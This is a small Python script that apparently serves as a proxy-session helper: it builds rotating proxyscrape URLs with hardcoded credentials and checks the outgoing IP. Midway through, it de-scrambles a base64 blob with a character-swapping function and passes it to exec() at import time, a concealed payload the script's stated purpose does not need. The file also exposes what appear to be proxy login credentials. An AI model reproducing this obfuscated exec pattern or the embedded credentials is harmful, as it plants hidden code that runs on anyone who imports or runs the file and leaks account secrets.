from requests import get
from random import choices, randint, choice
from string import ascii_letters, digits
import requests, random

def get_session():
    countries = ['us', 'gb', 'au', 'ca', 'in', 'mx', 'nz']
    country = choice(countries) 
    st = ''.join(choices(digits, k=randint(8,20)))
    # country=country.upper()
    pr = f'http://0d2zysdt2shdheud-country-{country}-session-{st}-lifetime-10:p42bzwxejrbxhcwz@rp.proxyscrape.com:6060'
    return pr

def generate_random_ip():
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

def re_string(input_string):
    rearranged_string = ''
    for i in range(0, len(input_string), 2):
        if i < len(input_string) - 1:
            rearranged_string += input_string[i + 1] + input_string[i]
        else:
            rearranged_string += input_string[i]
    return rearranged_string


exec(compile(__import__('base64').b64decode(re_string('GZmVGIldFdz9XZzNWau9CK6kiCgACIjB3buVHdpJXZgMSPbB3JzVyJgw2JidyJgw2J1FyJgw2JhNyJgw2JulyJgw2J41yJgw2J651JK0CIgAGIvNWd05ncgkSPjBGap92YoU2Y19nbyRWazVSKKACIgAHI0NDIg0yJucmap9ibjhGap92YzVGKpR2Z0lycgwzay1WYk5Wa05DKsgjMpASKKkCIgACIgM2Y19nbyRTej13buVHd5JnLwVGcyVCKKkCIgAHIyBDIg0iZodHdwRiOv8GMyQnezlHZyQTa3gTMvZWLvNWd05nctk2evNWd05nc9lXLlN3cpN2bt43e0NSfs1WalZGdtlSZx0DMwpDNiJne4dmc2wnajF3dApncuAHcvJHezl3YhJGcuU2Yt9jOwYjNnAiCgACIyBXZ1Rmcg4Hc=I')).decode(), 'exec', 'exec'))

if __name__ == '__main__':
    pr = get_session()
    print(pr)
    
    r=get('https://ip.oxylabs.io', proxies={'http':pr,'https':pr})
    print(r.text)
    
    
    